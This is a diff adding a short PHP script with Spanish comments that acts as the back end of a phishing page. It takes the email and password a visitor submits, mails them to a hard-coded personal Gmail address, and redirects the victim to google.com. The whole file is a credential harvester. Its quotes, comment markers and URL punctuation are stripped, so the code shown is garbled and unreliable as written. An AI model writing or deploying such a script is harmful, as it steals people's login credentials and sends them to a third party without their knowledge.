@@ -1,0 +1,22 @@
+php
+if ($_SERVER[REQUEST_METHOD] == POST) {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+     Configurar el correo a enviar
+    $destinatario = santiagojimenezisaza@gmail.com;
+    $asunto = Inicio de Sesión;
+    $mensaje = Se ha iniciado sesión.nCorreo $emailnContraseña $password;
+
+     Enviar el correo
+    $enviado = mail($destinatario, $asunto, $mensaje);
+
+    if ($enviado) {
+         Redireccionar después de enviar el correo
+        header(Location httpswww.google.com);
+        exit;  Asegura que el código se detenga después de la redirección
+    } else {
+        echo Hubo un error al enviar el correo.;
+    }
+}
+
